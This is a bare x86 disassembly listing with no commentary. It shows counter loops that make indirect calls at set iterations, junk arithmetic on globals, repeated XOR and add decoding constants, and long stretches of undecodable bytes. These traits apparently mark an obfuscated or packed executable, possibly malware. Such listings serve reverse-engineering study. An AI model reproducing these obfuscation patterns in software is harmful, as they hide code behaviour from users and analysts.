  408a92:	cmp    DWORD PTR ds:0x42e8ea,0x0
  408a99:	je     0x408add
  408a9f:	cmp    DWORD PTR ds:0x42e8ea,0x1f
  408aa6:	jne    0x408ac1
  408aac:	push   0x430616
  408ab1:	push   0x42efb0
  408ab6:	push   0x69fb
  408abb:	call   DWORD PTR ds:0x42ec2c
  408ac1:	mov    ecx,DWORD PTR ds:0x42e8ea
  408ac7:	dec    ecx
  408ac8:	mov    DWORD PTR ds:0x42e8ea,ecx
  408ace:	jmp    0x408a92
  408ad3:	adc    DWORD PTR ds:0x42e8e6,0x3f8f
  408add:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  408ae4:	mov    eax,DWORD PTR [ebp-0x4]
  408ae7:	sbb    edx,0xd84
  408aed:	mov    edx,DWORD PTR [ebp+0x10]
  408af0:	xor    DWORD PTR ds:0x430642,0x464
  408afa:	mov    ecx,0x7510856
  408aff:	xor    eax,ecx
  408b01:	jmp    0x408cf5
  408b06:	jno    0x408b66
  408b08:	test   bl,ah
  408b0a:	gs in  eax,0x51
  408b0d:	or     BYTE PTR fs:[eax],dh
  408b10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b11:	outs   dx,DWORD PTR ds:[esi]
  408b12:	jecxz  0x408b2e
  408b14:	pop    eax
  408b15:	add    al,0xa5
  408b17:	sar    BYTE PTR [esi+0x7e],cl
  408b1a:	inc    ebp
  408b1b:	jg     0x408b9b
  408b1d:	jle    0x408b41
  408b1f:	rol    BYTE PTR [ecx+ebp*2-0x3d],0xd7
  408b24:	ret    0x8ba0
  408b27:	outs   dx,DWORD PTR ds:[esi]
  408b28:	mov    bl,0x57
  408b2a:	pop    edx
  408b2b:	mov    eax,ebp
  408b2d:	mov    dh,0x74
  408b2f:	jl     0x408b13
  408b31:	or     esp,edx
  408b33:	jnp    0x408afe
  408b35:	out    dx,al
  408b36:	adc    eax,0x8e370794
  408b3b:	cld    
  408b3c:	cdq    
  408b3d:	jecxz  0x408ac9
  408b3f:	idiv   DWORD PTR [edx]
  408b41:	cmp    edx,DWORD PTR [ecx-0x57d2e691]
  408b47:	aas    
  408b48:	call   0x72f4304c
  408b4d:	mov    dh,0xed
  408b4f:	inc    esi
  408b50:	fwait
  408b51:	mov    ecx,0x7aff282
  408b56:	popa   
  408b57:	xchg   edx,eax
  408b58:	mov    cs,ebx
  408b5a:	bound  esp,QWORD PTR [edi]
  408b5c:	and    eax,0xc5189a3b
  408b61:	add    bh,dh
  408b63:	enter  0x7b1f,0x24
  408b67:	sbb    ecx,ecx
  408b69:	mov    WORD PTR [edi-0x1a],ds
  408b6c:	pop    ebp
  408b6d:	les    esp,FWORD PTR [ecx+0x6a]
  408b70:	cdq    
  408b71:	rcr    ah,cl
  408b73:	lods   al,BYTE PTR ds:[esi]
  408b74:	add    BYTE PTR [ebx+0x1af43d89],bh
  408b7a:	xchg   edi,eax
  408b7b:	xor    ebp,edi
  408b7d:	(bad)  
  408b7e:	sbb    dl,ch
  408b80:	aad    0x84
  408b82:	fnstcw WORD PTR [ecx+eiz*8-0x7d]
  408b86:	sbb    BYTE PTR [edi],0x49
  408b89:	sar    bh,0x17
  408b8c:	jl     0x408b26
  408b8e:	imul   ecx,DWORD PTR [edx+ebp*8],0xffffffbe
  408b92:	data16 mov dh,0xf6
  408b95:	and    edi,esi
  408b97:	mov    bh,0x5f
  408b99:	cmp    dh,BYTE PTR [eax+0x6949ca6d]
  408b9f:	ret    
  408ba0:	aaa    
  408ba1:	fs push 0xffffff87
  408ba4:	push   edx
  408ba5:	push   ss
  408ba6:	xor    BYTE PTR [edx],ch
  408ba8:	ins    DWORD PTR es:[edi],dx
  408ba9:	int3   
  408baa:	(bad)  
  408bab:	stc    
  408bac:	adc    al,BYTE PTR [ecx]
  408bae:	xchg   ecx,eax
  408baf:	mov    esp,0x629fdf44
  408bb4:	inc    ebp
  408bb5:	mov    fs:0x5b80f25d,al
  408bbb:	add    DWORD PTR [edx+0x57],ebx
  408bbe:	popf   
  408bbf:	retf   0x40be
  408bc2:	dec    ecx
  408bc3:	std    
  408bc4:	dec    si
  408bc6:	xchg   ecx,eax
  408bc7:	mov    ebx,0xd9dc3b3c
  408bcc:	iret   
  408bcd:	mov    cl,0x42
  408bcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bd0:	test   DWORD PTR [edx-0x6c],esi
  408bd3:	mov    ch,0x48
  408bd5:	dec    ebx
  408bd6:	stos   BYTE PTR es:[edi],al
  408bd7:	sbb    esp,DWORD PTR [eax-0x57e5e44]
  408bdd:	sar    DWORD PTR [ecx],1
  408bdf:	(bad)  
  408be0:	std    
  408be1:	test   al,0xa6
  408be3:	js     0x408b99
  408be5:	cwde   
  408be6:	xchg   DWORD PTR [ecx-0x7c65fe8a],esp
  408bec:	push   es
  408bed:	adc    cl,BYTE PTR [ebp-0x13]
  408bf0:	imul   ecx,ebx,0x7f5b6519
  408bf6:	inc    ebp
  408bf7:	mov    ah,0x32
  408bf9:	push   0x4af05df2
  408bfe:	cmc    
  408bff:	arpl   WORD PTR [ebx],ax
  408c01:	mov    ds,WORD PTR [esi]
  408c03:	fisttp QWORD PTR [ecx]
  408c05:	addr16 jmp 0x18db:0x4aaf9d45
  408c0d:	mov    bh,0xb0
  408c0f:	sbb    DWORD PTR [edx],0x4425a1aa
  408c15:	loopne 0x408c55
  408c17:	jno    0x408c3c
  408c19:	ja     0x408bed
  408c1b:	jae    0x408c2c
  408c1d:	inc    esp
  408c1e:	sbb    ch,BYTE PTR [esi+0x59]
  408c21:	jae    0x408c9a
  408c23:	in     eax,0xd8
  408c25:	out    dx,eax
  408c26:	mov    eax,ds:0x724f1d3
  408c2b:	inc    esp
  408c2c:	cdq    
  408c2d:	fisttp QWORD PTR [edx+0x4135b44f]
  408c33:	shl    BYTE PTR [eax-0x718388a6],cl
  408c39:	push   ebp
  408c3a:	mov    bh,0x63
  408c3c:	mov    esi,0x561b29b7
  408c41:	mov    edi,0xf857dae1
  408c46:	jle    0x408c07
  408c48:	(bad)  
  408c4a:	or     eax,0x67fe3e0a
  408c4f:	mov    esi,0x63ac0fbf
  408c54:	aam    0xa6
  408c56:	imul   esp,DWORD PTR [edx+0x4],0x77ea1492
  408c5d:	jbe    0x408be5
  408c5f:	lods   eax,DWORD PTR ds:[esi]
  408c60:	shl    BYTE PTR [edi-0x7b8af5c9],1
  408c66:	shr    BYTE PTR [edi],0x5
  408c69:	mov    ebp,0xe7155c88
  408c6e:	test   eax,0xff7797a5
  408c73:	daa    
  408c74:	jecxz  0x408ce2
  408c76:	xor    eax,0xb3161266
  408c7b:	or     BYTE PTR [ecx-0x53fdb2e0],dl
  408c81:	(bad)  
  408c84:	in     eax,0xfd
  408c86:	loop   0x408c2f
  408c88:	pop    ebp
  408c89:	and    esi,edi
  408c8b:	push   ds
  408c8c:	xchg   BYTE PTR [ecx+0x15],ch
  408c8f:	dec    edx
  408c90:	sub    eax,0xb01b7649
  408c95:	or     al,dh
  408c97:	call   0xa623:0x1875a081
  408c9e:	xchg   edi,eax
  408c9f:	dec    esp
  408ca0:	test   al,0x8
  408ca2:	cmc    
  408ca3:	pushf  
  408ca4:	lds    esi,FWORD PTR [ebx+0x29bbcb84]
  408caa:	das    
  408cab:	ja     0x408c4e
  408cad:	pop    edi
  408cae:	pop    ebp
  408caf:	ss mov bl,0xff
  408cb2:	inc    edx
  408cb3:	fst    QWORD PTR [ebx]
  408cb5:	push   esi
  408cb6:	mov    ecx,0xbdd78340
  408cbb:	neg    ebp
  408cbd:	jne    0x408cd9
  408cbf:	cmp    eax,0xa2eb681f
  408cc4:	pop    ds
  408cc5:	cmp    al,0x22
  408cc7:	xchg   ecx,eax
  408cc8:	add    edx,DWORD PTR [edi]
  408cca:	cli    
  408ccb:	inc    ebp
  408ccc:	inc    edx
  408ccd:	popf   
  408cce:	arpl   cx,bp
  408cd0:	fisttp QWORD PTR [eax+0x77]
  408cd3:	addr16 xchg edx,eax
  408cd5:	mov    al,BYTE PTR [edi+0x15]
  408cd8:	ss aad 0x88
  408cdb:	jge    0x408cf0
  408cdd:	xor    DWORD PTR [eax-0x1da4ea7d],edx
  408ce3:	out    0x60,al
  408ce5:	leave  
  408ce6:	cwde   
  408ce7:	ret    0x6123
  408cea:	sub    bl,BYTE PTR [ebx-0x7fdd44ae]
  408cf0:	inc    edx
  408cf1:	repnz or al,0x45
  408cf4:	mov    ebp,0x32729d05
  408cf9:	add    BYTE PTR [ecx-0x9ea74fe],cl
  408cff:	push   es
  408d00:	inc    ebx
  408d01:	add    BYTE PTR [ecx+0x430712],ah
  408d07:	sub    edx,eax
  408d09:	xor    edx,DWORD PTR [edx+eax*1]
  408d0c:	mov    eax,DWORD PTR [ebp+0x14]
  408d0f:	mov    edx,DWORD PTR [ebp+0x10]
  408d12:	mov    DWORD PTR [edx+0x4],eax
  408d15:	mov    eax,DWORD PTR [ebp+0x18]
  408d18:	mov    edx,DWORD PTR [ebp+0x10]
  408d1b:	mov    DWORD PTR [edx+0x8],eax
  408d1e:	mov    eax,DWORD PTR [ebp+0x1c]
  408d21:	mov    edx,DWORD PTR [ebp+0x10]
  408d24:	mov    DWORD PTR [edx+0xc],eax
  408d27:	mov    eax,DWORD PTR [ebp+0x20]
  408d2a:	mov    edx,DWORD PTR [ebp+0x10]
  408d2d:	mov    DWORD PTR [edx+0x10],eax
  408d30:	mov    eax,eax
  408d32:	mov    eax,DWORD PTR [ebp+0x14]
  408d35:	test   eax,eax
  408d37:	mov    eax,DWORD PTR [ebp+0x8]
  408d3a:	jne    0x408f37
  408d40:	mov    eax,DWORD PTR [ebp+0xc]
  408d43:	jmp    0x408f37
  408d48:	test   BYTE PTR [ebx+0x4d],al
  408d4b:	pushf  
  408d4c:	dec    ebp
  408d4d:	pushf  
  408d4e:	inc    ebp
  408d4f:	pop    ebx
  408d50:	cwde   
  408d51:	mov    ss,edx
  408d53:	aaa    
  408d54:	fwait
  408d55:	es mov al,0xbe
  408d58:	mov    esp,ss
  408d5a:	jle    0x408dda
  408d5c:	inc    ebp
  408d5d:	jg     0x408ddd
  408d5f:	jle    0x408d41
  408d61:	daa    
  408d62:	ror    ebp,0x2a
  408d65:	adc    BYTE PTR [bx+di-0x2d81],dh
  408d6a:	jns    0x408d44
  408d6c:	aaa    
  408d6d:	inc    esp
  408d6e:	pop    edx
  408d6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d70:	retf   0x85e5
  408d73:	mov    ds,WORD PTR [ebx-0x75]
  408d76:	aad    0x22
  408d78:	add    BYTE PTR [edx+0x4b],dh
  408d7b:	fsub   DWORD PTR [ebx-0x2764d810]
  408d81:	mov    bl,0xd0
  408d83:	cdq    
  408d84:	or     eax,0x593c3a38
  408d89:	cli    
  408d8a:	popf   
  408d8b:	mov    WORD PTR [edi-0x6fcfe439],fs
  408d91:	xchg   ebp,eax
  408d92:	pusha  
  408d93:	push   ebp
  408d94:	xor    BYTE PTR ds:0x3dc90c80,ah
  408d9a:	jmp    0x408d8c
  408d9c:	mov    WORD PTR [esi+0x4cae3e81],?
  408da2:	fisttp DWORD PTR [edx+0x53]
  408da5:	jl     0x408e25
  408da7:	inc    eax
  408da8:	cld    
  408da9:	jne    0x408df0
  408dab:	cs push edx
  408dad:	xchg   esp,eax
  408dae:	add    BYTE PTR [eax-0x3247390a],ah
  408db4:	and    ebp,DWORD PTR [edi+0x40]
  408db7:	jmp    0x62cd:0x66bee749
  408dbe:	xor    BYTE PTR [eax],ah
  408dc0:	add    BYTE PTR [ecx-0x57],0x9a
  408dc4:	cs pop ecx
  408dc6:	jle    0x408e0d
  408dc8:	ret    0x265c
  408dcb:	les    esp,FWORD PTR [ebp-0xe35befb]
  408dd1:	sar    bl,cl
  408dd3:	dec    esi
  408dd4:	adc    eax,0x9d585f3b
  408dd9:	ins    DWORD PTR es:[edi],dx
  408dda:	pop    ebp
  408ddb:	sub    edi,DWORD PTR [ecx]
  408ddd:	push   ebp
  408dde:	lock xor DWORD PTR [ebp+0x1899833],0x57d2c0dd
  408de9:	clc    
  408dea:	ret    0x855e
  408ded:	push   eax
  408dee:	loope  0x408def
  408df0:	mov    esp,esi
  408df2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408df3:	popf   
  408df4:	and    edi,DWORD PTR [ebx-0x1f]
  408df7:	dec    edx
  408df8:	adc    BYTE PTR [ebx],dl
  408dfa:	ds dec ebx
  408dfc:	pop    es
  408dfd:	ins    BYTE PTR es:[edi],dx
  408dfe:	pop    esp
  408dff:	and    ch,BYTE PTR [ebx+esi*8+0x1a52f33d]
  408e06:	ss pop eax
  408e08:	or     BYTE PTR fs:[eax+0x32],bl
  408e0c:	xor    BYTE PTR [edi],cl
  408e0e:	mov    al,ds:0x202ddcd1
  408e13:	push   esp
  408e14:	xor    ah,dh
  408e16:	push   esp
  408e17:	sub    ebx,DWORD PTR [ecx+0x26]
  408e1a:	mov    al,0x74
  408e1c:	(bad)  
  408e1d:	in     eax,dx
  408e1e:	es push 0xe4be197d
  408e24:	jmp    0x408dba
  408e26:	cs mov esp,0xe1685d0d
  408e2c:	clc    
  408e2d:	xchg   esi,eax
  408e2e:	lods   al,BYTE PTR ds:[esi]
  408e2f:	jno    0x408e17
  408e31:	pop    edi
  408e32:	dec    ebp
  408e33:	push   ebx
  408e34:	pop    esp
  408e35:	test   DWORD PTR [edi-0x4a479c2b],0xffc1ed90
  408e3f:	inc    ebx
  408e40:	xlat   BYTE PTR ds:[ebx]
  408e41:	in     eax,dx
  408e42:	lds    ecx,FWORD PTR [ecx+0xf]
  408e45:	pop    edi
  408e46:	lock xchg esp,eax
  408e48:	jmp    0x408ec5
  408e4a:	jg     0x408ec4
  408e4c:	aam    0xf2
  408e4e:	jae    0x408dfa
  408e50:	sbb    al,0x35
  408e52:	test   eax,0x6e506d19
  408e57:	nop
  408e58:	inc    eax
  408e59:	sub    eax,0x59c29dee
  408e5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e5f:	jp     0x408e6d
  408e61:	mov    DWORD PTR [ebx-0x2093bf],0x39da762b
  408e6b:	jg     0x408ec3
  408e6d:	xchg   ecx,eax
  408e6e:	sub    ecx,DWORD PTR [esi+0x3e73f4ec]
  408e74:	jnp    0x408e6d
  408e76:	mov    ebx,ds
  408e78:	mov    dh,0x13
  408e7a:	mov    ecx,0x94b58cb3
  408e7f:	fld    TBYTE PTR [ebp+0xb58fbc6]
  408e85:	and    BYTE PTR [esi-0x4d4368a5],ch
  408e8b:	adc    ch,dl
  408e8d:	cmc    
  408e8e:	mov    eax,0xf80359b7
  408e93:	fiadd  DWORD PTR [edx+0x22]
  408e96:	data16 int 0x1d
  408e99:	mov    DWORD PTR [ebp+esi*4+0x21e594a1],esi
  408ea0:	and    al,0x1b
  408ea2:	mov    ds:0x94a4a0b5,eax
  408ea7:	xchg   ebx,eax
  408ea8:	jns    0x408e4d
  408eaa:	dec    esp
  408eab:	pop    eax
  408eac:	pop    edx
  408ead:	sub    DWORD PTR [ebx-0x7d],0x2c
  408eb1:	jmp    0x408e3f
  408eb3:	in     al,dx
  408eb4:	fld    st(7)
  408eb6:	adc    ch,0x80
  408eb9:	loopne 0x408e45
  408ebb:	psubusw mm2,QWORD PTR [edi-0x44]
  408ebf:	add    ch,BYTE PTR [edx]
  408ec1:	shr    BYTE PTR [edx],cl
  408ec3:	test   esi,0x88e9475a
  408ec9:	ror    DWORD PTR [ecx],1
  408ecb:	fmulp  st(3),st
  408ecd:	fwait
  408ece:	call   0x4d718f11
  408ed3:	mov    al,0xa9
  408ed5:	lock push edi
  408ed7:	pop    ecx
  408ed8:	cmpps  xmm7,XMMWORD PTR [eax-0x3b],0x72
  408edd:	jne    0x408e94
  408edf:	dec    eax
  408ee0:	or     ebx,DWORD PTR [ebx]
  408ee2:	out    dx,eax
  408ee3:	gs push ds
  408ee5:	nop
  408ee6:	fild   QWORD PTR [ebx+0x27899314]
  408eec:	sub    DWORD PTR [ecx+0x16338818],0xffffffec
  408ef3:	scas   eax,DWORD PTR es:[edi]
  408ef4:	jne    0x408eb8
  408ef6:	loope  0x408f66
  408ef8:	mov    ebx,0x20ab468e
  408efd:	mov    ebx,0x88fc099e
  408f02:	int    0x1
  408f04:	ror    DWORD PTR ds:0x3f206a7a,0x25
  408f0b:	or     eax,esp
  408f0d:	sbb    eax,0xe93fb7f5
  408f12:	pop    esp
  408f13:	loopne 0x408f42
  408f15:	push   es
  408f16:	jnp    0x408f03
  408f18:	pop    esp
  408f19:	fidivr DWORD PTR [eax]
  408f1b:	sbb    BYTE PTR [eax],dh
  408f1d:	cmovo  esp,DWORD PTR [ecx-0x73]
  408f21:	mov    WORD PTR [ecx+ebx*4-0x59],?
  408f25:	push   ebp
  408f26:	sub    ecx,edx
  408f28:	pop    eax
  408f29:	sti    
  408f2a:	test   DWORD PTR [ebx+0x5e7b93a6],eax
  408f30:	ja     0x408f5f
  408f32:	adc    al,0x80
  408f34:	jo     0x408f64
  408f36:	xchg   esi,eax
  408f37:	xor    eax,ecx
  408f39:	add    eax,0x32729d
  408f3e:	leave  
  408f3f:	ret    0x1c
  408f42:	push   ebp
  408f43:	mov    ebp,esp
  408f45:	sub    esp,0x10c
  408f4b:	push   ebx
  408f4c:	sbb    DWORD PTR ds:0x42ef88,0x42e8ea
  408f56:	push   esi
  408f57:	push   edi
  408f58:	xor    DWORD PTR ds:0x4306c6,0x5477
  408f62:	push   0x412320
  408f67:	sbb    DWORD PTR ds:0x42efa8,0x42e8e6
  408f71:	call   DWORD PTR ds:0x42ebcc
  408f77:	sbb    DWORD PTR ds:0x42e8e2,0x6315
  408f81:	test   eax,eax
  408f83:	je     0x408f9a
  408f89:	or     DWORD PTR ds:0x43062e,0x658e
  408f93:	xor    eax,eax
  408f95:	jmp    0x40a1a9
  408f9a:	or     DWORD PTR ds:0x430632,0x1a2e
  408fa4:	push   0x412364
  408fa9:	call   DWORD PTR ds:0x42ec84
  408faf:	sbb    DWORD PTR ds:0x4306d2,0x34b4
  408fb9:	test   ax,ax
  408fbc:	mov    DWORD PTR ds:0x42e8da,0xd26
  408fc6:	je     0x408feb
  408fcc:	push   0x786876
  408fd1:	push   0x55897097
  408fd6:	adc    DWORD PTR ds:0x430642,0x42ef88
  408fe0:	call   DWORD PTR ds:0x42ed00
  408fe6:	jmp    0x40a1a9
  408feb:	sub    DWORD PTR ds:0x42efa4,0x1c30
  408ff5:	call   DWORD PTR ds:0x42ecc4
  408ffb:	cdq    
  408ffc:	cmp    eax,0x67876766
  409001:	mov    DWORD PTR ds:0x4306da,0x4f36
  40900b:	jne    0x409041
  409011:	cmp    edx,0x86189768
  409017:	mov    DWORD PTR ds:0x42ef94,0x24b9
  409021:	jne    0x409041
  409027:	sub    DWORD PTR ds:0x42e8e2,0x452
  409031:	push   0x412380
  409036:	call   DWORD PTR ds:0x42ebbc
  40903c:	jmp    0x40a1a9
  409041:	neg    DWORD PTR ds:0x43062a
  409047:	push   0x4123e0
  40904c:	adc    DWORD PTR ds:0x42efa4,0x43061a
  409056:	call   DWORD PTR ds:0x42ec5c
  40905c:	test   ax,ax
  40905f:	jne    0x408f89
  409065:	and    DWORD PTR ds:0x42e8e2,0x0
  40906f:	xor    ebx,ebx
  409071:	xor    ebx,DWORD PTR ds:0x42e8e2
  409077:	inc    ebx
  409078:	mov    DWORD PTR ds:0x42e8e2,ebx
  40907e:	cmp    DWORD PTR ds:0x42e8e2,0x28
  409085:	jne    0x409097
  40908b:	push   DWORD PTR [ebp-0x10]
  40908e:	push   DWORD PTR [ebp-0x18]
  409091:	call   DWORD PTR ds:0x42ed2c
  409097:	cmp    DWORD PTR ds:0x42e8e2,0x1c
  40909e:	jb     0x40906f
  4090a4:	mov    edx,DWORD PTR ds:0x42ef94
  4090aa:	and    DWORD PTR ds:0x42efa0,edx
  4090b0:	mov    ecx,0xf89c8535
  4090b5:	movzx  edx,BYTE PTR ds:0x43060e
  4090bc:	sbb    edx,DWORD PTR ds:0x4306ce
  4090c2:	mov    DWORD PTR ds:0x43060e,edx
  4090c8:	mov    DWORD PTR [ebp-0x20],ecx
  4090cb:	and    DWORD PTR ds:0x43061e,0x0
  4090d5:	mov    edx,DWORD PTR ds:0x43061e
  4090db:	inc    edx
  4090dc:	mov    DWORD PTR ds:0x43061e,edx
  4090e2:	cmp    DWORD PTR ds:0x43061e,0x21
  4090e9:	jne    0x409109
  4090ef:	push   0x59b7
  4090f4:	push   0x42e8fa
  4090f9:	push   0x42ea2d
  4090fe:	push   0x7470
  409103:	call   DWORD PTR ds:0x42ed30
  409109:	cmp    DWORD PTR ds:0x43061e,0x15
  409110:	jb     0x4090d5
  409116:	and    DWORD PTR ds:0x42e8e6,0x0
  409120:	mov    edx,DWORD PTR ds:0x42e8e6
  409126:	inc    edx
  409127:	mov    DWORD PTR ds:0x42e8e6,edx
  40912d:	cmp    DWORD PTR ds:0x42e8e6,0x20
  409134:	jne    0x40914a
  40913a:	push   0x704d
  40913f:	push   0x180e
  409144:	call   DWORD PTR ds:0x42ec30
  40914a:	cmp    DWORD PTR ds:0x42e8e6,0x13
  409151:	jb     0x409120
  409157:	adc    DWORD PTR ds:0x43061a,edi
  40915d:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409164:	and    DWORD PTR ds:0x43060a,0x0
  40916e:	mov    esi,DWORD PTR ds:0x43060a
  409174:	inc    esi
  409175:	mov    DWORD PTR ds:0x43060a,esi
  40917b:	cmp    DWORD PTR ds:0x43060a,0xd
  409182:	jne    0x40919d
  409188:	push   0x42e9fb
  40918d:	push   0x42e8fa
  409192:	push   0x400000
  409197:	call   DWORD PTR ds:0x42ec48
  40919d:	cmp    DWORD PTR ds:0x43060a,0xc
  4091a4:	jne    0x4091b7
  4091aa:	mov    esi,DWORD PTR ds:0x43060a
  4091b0:	inc    esi
  4091b1:	mov    DWORD PTR ds:0x43060a,esi
  4091b7:	cmp    DWORD PTR ds:0x43060a,0x14
  4091be:	jb     0x40916e
  4091c4:	sub    esi,DWORD PTR ds:0x42ef9c
  4091ca:	lea    eax,[ebp-0x58]
  4091cd:	mov    DWORD PTR [ebp-0x60],eax
  4091d0:	add    esi,esi
  4091d2:	lea    eax,[ebp-0x50]
  4091d5:	inc    ebx
  4091d6:	mov    DWORD PTR [ebp-0x10],eax
  4091d9:	inc    esi
  4091da:	mov    eax,ds:0x4121a8
  4091df:	mov    eax,DWORD PTR [eax+0x1c8]
  4091e5:	or     DWORD PTR ds:0x4306ce,0x430622
  4091ef:	mov    eax,DWORD PTR [eax]
  4091f1:	add    esi,ebx
  4091f3:	mov    edx,DWORD PTR [ebp-0x10]
  4091f6:	xor    esi,esi
  4091f8:	xor    esi,DWORD PTR ds:0x4306ce
  4091fe:	adc    DWORD PTR ds:0x42ef98,esi
  409204:	mov    esi,0x7510856
  409209:	xor    DWORD PTR ds:0x43060e,ebx
  40920f:	xor    eax,esi
  409211:	mov    ebx,0x32729d
  409216:	add    eax,ebx
  409218:	mov    DWORD PTR [edx],eax
  40921a:	mov    eax,ds:0x43060e
  40921f:	mov    eax,ds:0x4124e4
  409224:	cmp    eax,0x23d14057
  409229:	mov    eax,DWORD PTR [ebp-0x18]
  40922c:	mov    DWORD PTR ds:0x43060e,0x7d60
  409236:	je     0x409262
  40923c:	mov    ecx,DWORD PTR [ebp-0x20]
  40923f:	xor    eax,esi
  409241:	adc    DWORD PTR ds:0x43061e,0x43063a
  40924b:	add    eax,ebx
  40924d:	imul   eax,ecx
  409250:	mov    DWORD PTR ds:0x43062e,0x73a3
  40925a:	mov    DWORD PTR [ebp-0x20],eax
  40925d:	jmp    0x409dc0
  409262:	xor    eax,esi
  409264:	adc    edx,0x5f1b
  40926a:	add    eax,ebx
  40926c:	mov    ds:0x4122b8,eax
  409271:	mov    edx,DWORD PTR ds:0x430662
  409277:	mov    eax,ds:0x42eb1c
  40927c:	sub    eax,edx
  40927e:	or     edx,DWORD PTR [edx+eax*1]
  409281:	mov    eax,DWORD PTR [ebp-0x20]
  409284:	xor    eax,esi
  409286:	add    eax,ebx
  409288:	mov    ds:0x4124e4,eax
  40928d:	sub    DWORD PTR ds:0x42e8ee,0x78a9
  409297:	mov    eax,DWORD PTR [ebp-0x18]
  40929a:	add    edx,DWORD PTR ds:0x43062a
  4092a0:	mov    edx,DWORD PTR ds:0x4122b8
  4092a6:	neg    DWORD PTR ds:0x43063a
  4092ac:	xor    eax,esi
  4092ae:	dec    DWORD PTR ds:0x430632
  4092b4:	add    eax,ebx
  4092b6:	mov    DWORD PTR ds:0x4306d6,0x3216
  4092c0:	cmp    edx,eax
  4092c2:	jne    0x409dc0
  4092c8:	mov    eax,DWORD PTR [ebp-0x18]
  4092cb:	add    edx,0x2278
  4092d1:	mov    DWORD PTR [ebp-0x30],eax
  4092d4:	mov    eax,DWORD PTR [ebp-0x20]
  4092d7:	mov    DWORD PTR ds:0x42efa0,0x10
  4092e1:	cmp    DWORD PTR ds:0x42efa0,0x0
  4092e8:	je     0x409328
  4092ee:	cmp    DWORD PTR ds:0x42efa0,0x16
  4092f5:	jne    0x409310
  4092fb:	push   0x55c8
  409300:	push   0x6c0c
  409305:	push   0x400000
  40930a:	call   DWORD PTR ds:0x42ec4c
  409310:	mov    edi,DWORD PTR ds:0x42efa0
  409316:	dec    edi
  409317:	mov    DWORD PTR ds:0x42efa0,edi
  40931d:	jmp    0x4092e1
  409322:	add    DWORD PTR ds:0x42ef94,ebx
  409328:	mov    DWORD PTR [ebp-0x1c],eax
  40932b:	or     DWORD PTR ds:0x42e8f6,0x513d
  409335:	mov    eax,ds:0x4121a8
  40933a:	mov    eax,DWORD PTR [eax+0x198]
  409340:	not    edx
  409342:	mov    DWORD PTR [ebp-0xc],eax
  409345:	xor    edx,edx
  409347:	add    edx,DWORD PTR ds:0x42e8f2
  40934d:	adc    edx,DWORD PTR ds:0x430642
  409353:	mov    DWORD PTR ds:0x42e8f2,edx
  409359:	mov    eax,DWORD PTR [ebp-0x1c]
  40935c:	mov    edx,DWORD PTR [ebp-0xc]
  40935f:	and    DWORD PTR ds:0x42efac,0x0
  409369:	mov    edi,DWORD PTR ds:0x42efac
  40936f:	inc    edi
  409370:	mov    DWORD PTR ds:0x42efac,edi
  409376:	cmp    DWORD PTR ds:0x42efac,0x6
  40937d:	jne    0x409391
  409383:	push   DWORD PTR [ebp-0x10]
  409386:	push   0x42e8e6
  40938b:	call   DWORD PTR ds:0x42ed34
  409391:	cmp    DWORD PTR ds:0x42efac,0x5
  409398:	jne    0x4093ad
  40939e:	xor    edi,edi
  4093a0:	xor    edi,DWORD PTR ds:0x42efac
  4093a6:	inc    edi
  4093a7:	mov    DWORD PTR ds:0x42efac,edi
  4093ad:	cmp    DWORD PTR ds:0x42efac,0x1b
  4093b4:	jb     0x409369
  4093ba:	xor    DWORD PTR ds:0x430632,0x56f9
  4093c4:	xor    eax,esi
  4093c6:	and    DWORD PTR ds:0x42efa8,0x0
  4093d0:	jmp    0x4093e2
  4093d5:	mov    edi,DWORD PTR ds:0x42efa8
  4093db:	inc    edi
  4093dc:	mov    DWORD PTR ds:0x42efa8,edi
  4093e2:	cmp    DWORD PTR ds:0x42efa8,0x1f
  4093e9:	jae    0x40946a
  4093ef:	cmp    DWORD PTR ds:0x42efa8,0x6
  4093f6:	jne    0x409402
  4093fc:	call   DWORD PTR ds:0x42ec50
  409402:	cmp    DWORD PTR ds:0x42efa8,0x5
  409409:	jne    0x40941c
  40940f:	mov    edi,DWORD PTR ds:0x42efa8
  409415:	inc    edi
  409416:	mov    DWORD PTR ds:0x42efa8,edi
  40941c:	jmp    0x4093d5
  409421:	mov    DWORD PTR ds:0x42ef8c,0x12
  40942b:	cmp    DWORD PTR ds:0x42ef8c,0x0
  409432:	je     0x40946a
  409438:	cmp    DWORD PTR ds:0x42ef8c,0x21
  40943f:	jne    0x409450
  409445:	push   0x79c1
  40944a:	call   DWORD PTR ds:0x42ec34
  409450:	xor    edi,edi
  409452:	or     edi,DWORD PTR ds:0x42ef8c
  409458:	dec    edi
  409459:	mov    DWORD PTR ds:0x42ef8c,edi
  40945f:	jmp    0x40942b
  409464:	and    edi,DWORD PTR ds:0x4306da
  40946a:	add    eax,ebx
  40946c:	mov    DWORD PTR [edx],eax
  40946e:	lea    eax,[ebp-0x14]
  409471:	and    edi,DWORD PTR ds:0x43060a
  409477:	mov    DWORD PTR [ebp-0x44],eax
  40947a:	mov    edi,DWORD PTR ds:0x43061e
  409480:	adc    edi,DWORD PTR ds:0x42ef98
  409486:	mov    DWORD PTR ds:0x43061e,edi
  40948c:	mov    eax,DWORD PTR [ebp-0x1c]
  40948f:	sbb    DWORD PTR ds:0x42efb0,0x42e8ea
  409499:	mov    edx,DWORD PTR [ebp-0x44]
  40949c:	sbb    DWORD PTR ds:0x42efa0,0x43063a
  4094a6:	xor    eax,esi
  4094a8:	add    eax,ebx
  4094aa:	movzx  edi,WORD PTR ds:0x430642
  4094b1:	and    DWORD PTR ds:0x43063e,edi
  4094b7:	mov    DWORD PTR [edx],eax
  4094b9:	add    DWORD PTR ds:0x42e8f6,0x43061a
  4094c3:	mov    DWORD PTR [ebp-0x54],ecx
  4094c6:	or     edi,edi
  4094c8:	lea    eax,[ebp-0x54]
  4094cb:	mov    DWORD PTR [ebp-0x10],eax
  4094ce:	sub    ecx,DWORD PTR ds:0x430626
  4094d4:	mov    eax,DWORD PTR [ebp-0x54]
  4094d7:	mov    ecx,DWORD PTR [ebp-0x10]
  4094da:	mov    DWORD PTR ds:0x42efac,0x1c
  4094e4:	cmp    DWORD PTR ds:0x42efac,0x0
  4094eb:	je     0x409533
